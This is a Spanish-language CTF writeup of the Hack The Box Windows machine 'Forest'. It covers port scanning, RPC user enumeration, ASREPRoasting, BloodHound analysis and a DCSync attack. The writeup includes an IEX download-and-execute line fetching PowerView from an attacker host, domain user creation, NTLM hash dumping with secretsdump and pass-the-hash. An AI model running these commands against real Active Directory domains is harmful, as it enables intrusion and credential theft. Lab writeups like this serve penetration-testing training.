---
layout: single
title: Forest Writeup HTB (OSCP Style)
excerpt: "En el siguiente articulo veremos como realizar la explotacipón de  Forest en HTB"
date: 2022-05-24
classes: wide
image: /assets/img/posts/HTB/forest/forest.png
categories:
  - HTB
tags:
  - Hacking
---
![header-forest](/assets/img/posts/HTB/forest/forest.png)

## Datos de la Máquina

| Contenido | Descripción |                                                                                                                                        
|--|--|                                                                                                                                                            
| OS: | ![windows](/assets/img/posts/windows.png) |                                                                                                                                         
| Dificultad: | Fácil |                                                                                                                                            
| Puntos: | 20 |                                                                                                                                                   
| Lanzamiento: | 12 Oct 2019 |                                                                                                                                
| Creadores: |[mrb3n](https://app.hackthebox.com/users/2984) [egre55](https://app.hackthebox.com/users/1190)|

# Reconocimiento

Lo primero que haremos sera agregar la ip de la máquina víctima a nuestro archivo **/etc/hosts**, nos tendria que quedar algo asi:

![hosts](/assets/img/posts/HTB/forest/01.png)

## Nmap

Una agregada la ip a nuestro archivo, procedemos a realizar un barrido a los **65535** puertos **TCP/IP**, esto lo realizaremos con el siguiente comando:

```console
nmap -n -p- --min-rate 10000 forest.htb -oA all-ports
```

Y como podemos observar en la siguiente imagen nos encontramos con los siguientes puertos abiertos:

- 53 (domain)
- 88 (kerberos-sec)
- 135 (msrpc)
- 139 (netbios-ssn)
- 389 (ldap)
- 445 (microsoft-ds)
- 464 (kpasswd5)
- 593 (http-rpc-epmap)
- 636 (ldapssl)
- 3268 (globalcatLDAP)
- 3269 (globalcatLDAPssl)
- 5985 (wsman)
- 9389 (adws)
- 47001 (winrm)
- 49664 (unknown)
- 49665 (unknown)
- 49666 (unknown)
- 49667 (unknown)
- 49670 (unknown)
- 49676 (unknown)
- 49677 (unknown)
- 49699 (unknown) 

![enum-ports](/assets/img/posts/HTB/forest/02.png)

Una vez identificados los puertos abiertos, procedemos a identificar las versiones y servicios de cada uno, al igual que le arrojaremos script para identificar más a fondo el puertos.

Esto lo haremos con el siguiente comando:

```console
nmap -n -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49670,49676,49677,49699 forest.htb -oA nmap-scripts
```
Nota: Cabe mencionar que el argumento **-sCV** es una union de usar **-sC** y **-sV**

![nmap-scripts](/assets/img/posts/HTB/forest/03.png)

Como podemos observar, los scripts nos arrojaron bastente información del protocolo smb, lo cual realizaremos una enumeración de forma manual para poder buscar nuestro punto de entrada.

# Enumeración

## SMB

Para hacer la enumeración de **SMB** usamos las herramientas **smbclient** y **smbmap**, lo cual no nos arrojo ninguna información relevante.

![smbclient](/assets/img/posts/HTB/forest/04.png)

![smbmap](/assets/img/posts/HTB/forest/05.png)

## RPC

Pero como observamos que la máquina víctima tenia el puerto **135** abierto, lo cual tratamos de conectarnos con un usuario **NULL**, y tenemos exitó.

![rcpcleint](/assets/img/posts/HTB/forest/06.png) 

Una vez que obtuvimos a los usuarios del dominios, los guardaremos en un archivo de texto y usaremos la terminal para que unicamente, nos ponga los usuarios validos en otro archivo, para ellos ejecutaremos lo siguiente:

```console
cat rpc.txt | cut -d '[' -f2 | cut -d ']' -f1 | awk 'length < 15' > users.txt
```
Y como observamos nos encontró to usuarios:

![users-rpc](/assets/img/posts/HTB/forest/07.png)

# Explotación

## ASREPRoast

Investigando a fondo en internet, nos dimos cuenta que el ataque **ASREPRoast** era muy probable.

Este ataque se basa en encontrar usuarios que no requieren una pre-autenticación de **Kerberos**. Lo cual significa que cualquier puede enviar una petición **AS_REQ** en nombre de uno de esos usuarios y recibir un mensaje **AS_REQ** correcto. Esta respuesta contiene un pedazo del mensaje cifrado con la clave de usuario, que se obtiene  de su contraseña. Por lo tanto, este mensaje se puede tratar de crackear de manera offline para obtener las credenciales de dicho usuario.

Para realizar el ataque se hará uso de la herramienta **crackmapexec**, el cual nos arrojó un resultado exitoso.

![cme-as](/assets/img/posts/HTB/forest/08.png)

Ahora procedemos a copiar el hash y guardarlo en un archivo de texto, para posteriormente pesarlo por john.

![john](/assets/img/posts/HTB/forest/09.png)

## Shell como usuario SVC-alfresco

Una vez que obtuvimos, las credenciales del usuario **svc-alfresco**, procederemos a conectarnos mediante **winrm**, para esto usaremos **evil-winrm**.

```console
evil-winrm -i forest.htb -u svc-alfresco -p s***e 
```

Como podemos observar en la siguiente imágen, nos da acceso y obtenemos las primer bandera.

![winrm](/assets/img/posts/HTB/forest/10.png)

## Enumeración con BloodHound

Primero que nada, ¿Qué es Bloodhound?.

Bloodhound es una aplicación de código abierto que se utiliza para analizar la seguridad de los dominios del directorio activo. La herramienta está inspirada en la teoría de grafos y los permisos de objetos del directorio activo. La herramienta realiza la ingestión de datos de los dominios de Active Directory y destaca el potencial de escalada de derechos en los dominios de Active Directory, descubriendo así rutas de ataque ocultas o complejas que pueden comprometer la seguridad de una red.

[Bloodhound](https://latesthackingnews.com/2018/09/25/bloodhound-a-tool-for-exploring-active-directory-domain-security/)

Para comenzar la enumeración, lo primero que haremos será levantar nuestro servicio **neo4j** y **bloodhound**, esto lo haremos con los siguientes comandos:

```console

sudo neo4j console

bloodhound

```

Usaremos [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe), en nuestra máquina vćtima para hacer la enumeración.

Primero levantaremos un servidor en samba para pasar el archivo a la máquina víctima.

![sharphound](/assets/img/posts/HTB/forest/11.png)

Una vez realizado esto nos generara un archivo **.zip**, lo cual mandaremos a la máquina atacante.

![shaphound-kali](/assets/img/posts/HTB/forest/12.png)

Una vez realizado esto unicamente arrastramos el **.zip**, hacia **Bloodhound**.

Una vez exportado nuestro **.zip**, filtraremos el usuario **SVC-ALFRESCO**, le damos click derecho y  presionamos donde dice **Mark User as Owned**.

![owned](/assets/img/posts/HTB/forest/13.png)

Con esto le diremos a Bloodhound que tenemos las credenciales de **SVC-ALFRESCO**

![query](/assets/img/posts/HTB/forest/14.png)

Ejecutamos la Query **Shortest Path to Domain Admins from Owned Principals**  
Y nos dira la ruta más corta para apoderarlos del DC.

## Ataque DCsync

**DCsync:** Este ataque nos permite pretender ser un controlador de dominio y solicitar datos de contraseña de cualquier usuario. esto puede ser utilizado por los atacantes para obtener el hash NTLM de cualquier cuenta, incluida la cuenta KRBTGT, que permite a los atacantes crear Golden Tickets.

- Podemos observar que el usuario SVC-ALFRESCO es miembro de SERVICE ACCOUNTS, PRIVILAGED IT ACCOUNTS y ACCOUNTS OPERATORS.

- Los miembros del grupo ACCOUNT OPERATORS tienen privilegios GenericAll sobre el grupo EXCHANGE WINDOWS PERMISSIONS. Esto significa que tenemos control total para manipular cualquier objeto de destino.

- Los miembros del grupo EXCHANGE WINDOWS PERMISSIONS tienen permisos de escritura sobre DACL (Discretionary Access Control List) en el dominio HTB.LOCAL. Esto significa que podemos otorgarnos el privilegio de DcSync.

- Con este privilegio nosotros seremos capaces de llevar acabo un ataque de DcSync.

![estrategia](/assets/img/posts/HTB/forest/15.png)

Para llevar acabo este ataque necesitamos hacer uso de el script **PowerView.ps1**, el cual podemos obtener del repositorio [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

**Nota:** Si le damos clic derecho sobre la linea de **WriteDacl** y presionamos en **Abuse Info** podemos observar los comandos que vamos a utilizar.

![abuse-info](/assets/img/posts/HTB/forest/16.png)

Lo primero que haremos será crear un usuario nuesvo con lo siguiente y verificaremos que los permisos se hayan aplicado.

```console
net user cyb3r3xpl0it password \add \domain

net user /domain

net group "Exchange Windows Permissions" /add cyb3r3xpl0it

net user cyb3r3xpl0it

```

Una vez esto descargamos y ejecutamos PowerView.ps1, para ello creamos un servidor virtual con python.

```console
python -m http.server 80
```

Una vez esto ejecutaremos el **PowerView**

```console
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerView.ps1')
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\cyb3r3xpl0it', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity 'cyb3r3xpl0it' -Rights DCSync
```

![perms](/assets/img/posts/HTB/forest/17.png)

Dumpeamos los **hashes** NTLM en la máquina atacante.

```console
impacket-secretsdump htb.local/cyb3r3xpl0it:password@forest.htb
```

![dump](/assets/img/posts/HTB/forest/18.png)

Obtenemos el Hash de **Administrator** que nos ayudará hacer un passthehash con **psexec**

![psexec](/assets/img/posts/HTB/forest/19.png)

Una vez esto, tenemos permisos de Administrador, buscamos la ultima bandera

![flag-root](/assets/img/posts/HTB/forest/20.png)

Good Luck! and Happy Hacking!